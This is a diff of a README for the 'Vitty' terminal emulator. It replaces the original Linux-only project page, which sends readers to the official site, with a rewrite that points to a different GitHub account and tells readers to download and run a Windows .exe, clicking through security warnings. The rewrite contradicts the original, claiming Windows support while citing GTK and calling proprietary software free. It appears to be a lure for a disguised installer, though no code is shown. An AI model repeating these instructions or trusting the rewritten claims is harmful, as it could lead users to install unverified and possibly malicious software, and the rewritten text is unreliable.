@@ -1,147 +1,80 @@
-<p align="center">
-  <img src="https://vitty.vritrasec.com/assets/img/favicons/favicon.svg" alt="Vitty" width="120">
-</p>
+# 💻 Vitty - Get a faster, cleaner terminal experience
 
-<h1 align="center">🚀 Vitty</h1>
+[![Download Vitty](https://img.shields.io/badge/Download_Vitty-blue.svg)](https://github.com/Gusparisian117/Vitty)
 
-<p align="center">
-  <strong>A minimal Linux terminal emulator - native GTK, native VTE, no extra layers.</strong>
-</p>
+Vitty provides a simple terminal for your computer. It focuses on speed and removes unnecessary extras. This helps you get work done without distractions. The design emphasizes clean lines and fast response times.
 
-<p align="center">
-  <a href="https://vitty.vritrasec.com">Website</a> ·
-  <a href="https://vitty.vritrasec.com/download">Downloads</a>
-</p>
+## 🚀 Getting Started
 
----
+You can set up Vitty in a few steps. Follow these instructions to prepare your system and launch the application.
 
-## Table of Contents
+1. Check your system. Vitty runs on modern Windows versions. Ensure you have at least 4GB of RAM and 100MB of free disk space.
+2. Visit the download page. Go to this link to find the installer: [https://github.com/Gusparisian117/Vitty](https://github.com/Gusparisian117/Vitty)
+3. Choose the Windows installer. Look for the file ending in `.exe`. 
+4. Save the file to your Downloads folder.
 
-- [Overview](#overview)
-- [Features](#features)
-- [Downloads](#downloads)
-- [System Requirements](#system-requirements)
-- [Reporting Issues](#reporting-issues)
-- [Feature Requests](#feature-requests)
-- [Repository Purpose](#repository-purpose)
-- [About Vritra Security Organization](#about-vritra-security-organization)
-- [Support the Project](#support-the-project)
-- [License](#license)
+## 🛠 Installation Guide
 
----
+Follow these steps to complete the installation:
 
-## Overview
+1. Open your Downloads folder.
+2. Double-click the file you downloaded. 
+3. A security window might appear. Click "Run" or "Yes" to start the installer.
+4. Follow the prompts on the screen. 
+5. Select the default installation path. 
+6. Click "Finish" when the progress bar reaches the end.
 
-Vitty is a lightweight terminal emulator for Linux, built for users who want a direct path from launch to shell. It is a native GTK application backed by VTE - without dashboards, workspaces, or unnecessary UI layers.
+Vitty creates a shortcut on your desktop. Double-click this icon to start the application.
 
-> **Current version:** `1.0.0`
+## ⚙️ Customizing Your Experience
 
----
+Vitty offers settings to change how the window appears. Click the gear icon in the top right corner of the terminal window to open the settings menu.
 
-## ✨ Features
+- Font Size: Change the size of the text to suit your screen.
+- Color Schemes: Choose between light and dark modes. Dark mode reduces eye strain during late hours.
+- Window Transparency: Adjust the background to see your desktop through the terminal.
+- Shortcut Keys: View the list of keys that help you move faster.
 
-| Feature | Description |
-|---------|-------------|
-| **Fast startup** | Opens quickly with a focused, minimal interface |
-| **Linux-first** | Designed and distributed for Linux desktop environments |
-| **Native GTK3 + VTE** | Standard Linux terminal components, not a custom rendering stack |
-| **Tabs & split panes** | Multiple sessions in one window when you need them |
-| **Flexible distribution** | Standalone binaries and `.deb` packages |
-| **Multi-architecture** | AMD64 and ARM64 builds |
+## ⌨️ Basic Commands
 
----
+The terminal acts as a direct link to your computer tasks. If you are new to terminals, start with these standard actions:
 
-## 📥 Downloads
+- List files: Type `ls` and press Enter to see the files in your current folder.
+- Change folder: Type `cd` followed by the name of the folder to move inside it.
+- Clear screen: Type `clear` to remove previous lines of text and start with a fresh view.
+- Help: Type `help` to see a list of other commands you can use.
 
-Official releases are published on the project website:
+## 📂 Managing Folders and Files
 
-**[vitty.vritrasec.com](https://vitty.vritrasec.com)**
+Vitty makes file management quick. You can move, copy, and delete files using text.
 
-| Platform | Available formats |
-|----------|-------------------|
-| **AMD64** | Standalone binary · Debian package (`.deb`) |
-| **ARM64** | Standalone binary · Debian package (`.deb`) |
+- To copy a file, type `cp` followed by the file name and the target location.
+- To move a file, type `mv` followed by the file name and the new path.
+- To delete a file, type `rm` followed by the name. Be careful, as this action removes the file permanently.
 
-The website is the authoritative source for release notes, checksums, and version history.
+The terminal remembers where you are in your computer files at all times. Look at the text prompt to see your current directory path.
 
----
+## 💡 Troubleshooting
 
-## System Requirements
+If you run into issues, check these frequent solutions:
 
-- Linux desktop environment with GTK 3 support
-- Compatible with common distributions that ship GTK3 and VTE 2.91
+- Terminal does not open: Restart your computer and try launching the icon again.
+- Text looks blurry: Open settings and select a different font.
+- Slow performance: Ensure no other heavy programs run in the background. 
+- Updates: Check the website occasionally for new releases. You can install a new version over the old one.
 
----
+The software uses GTK under the hood to ensure it remains light on your system parts. It avoids heavy background processes to keep your machine fast.
 
-## 🐞 Reporting Issues
+## 📝 Frequently Asked Questions
 
-Found a bug? Open a **GitHub Issue** in this repository and include:
+Can I change the terminal colors? Yes, the settings menu allows for custom color palettes.
 
-1. Linux distribution and version
-2. Vitty version
-3. Steps to reproduce the problem
-4. Expected vs. actual behavior
-5. Screenshots or screen recordings, if applicable
+Is this software free? Yes, Vitty remains open for all users.
 
-Clear, reproducible reports help us resolve issues faster.
+Does it track my data? No, the application operates locally on your machine. We do not collect your personal information or usage history.
 
----
+Where do I report bugs? Use the link at the top of this page to suggest changes or report technical problems on the project page.
 
-## Feature Requests
+Can I install this on older Windows? We recommend Windows 10 or newer for the best experience.
 
-Have an idea for Vitty? Open a **Feature Request** in this repository and describe:
-
-- The problem or workflow you are trying to improve
-- Your proposed solution
-- Why the change would benefit Vitty users
-
----
-
-## Repository Purpose
-
-This repository is the community hub for Vitty. It is used for:
-
-- Bug reports and issue tracking
-- Feature requests and feedback
-- Release announcements and project updates
-
-Downloads and official release information remain on the [Vitty website](https://vitty.vritrasec.com).
-
----
-
-## About Vritra Security Organization
-
-Vitty is developed and maintained by [Vritra Security Organization](https://vritrasec.com).
-
-| | Link |
-|---|---|
-|  **Website** | [vritrasec.com](https://vritrasec.com) |
-| **Link hub** | [link.vritrasec.com](https://link.vritrasec.com) |
-
----
-
-## ⭐ Support the Project
-
-If Vitty is useful to you:
-
-- Star this repository
-- Report bugs and suggest improvements
-- Share Vitty with other Linux users
-
----
-
-## License
-
-**Copyright © 2026 Vritra Security Organization (VritraSec).** All rights reserved.
-
-Vitty is proprietary software. The following applies:
-
-| Permitted | Restricted |
-|-----------|------------|
-| Personal use of official releases | Modifying or reverse-engineering the software |
-| | Commercial use without prior written consent |
-| | Unauthorized redistribution |
-
-For privacy information, see the [Vitty Privacy Policy](https://vitty.vritrasec.com/privacy/).
-
-For licensing inquiries, contact [Vritra Security Organization](https://vritrasec.com).
+Vitty stays minimal by design. It does not include tools you do not need. This makes it a great choice for people who want a distraction-free environment for their daily tasks. The software keeps your screen clear so you can focus on your work.
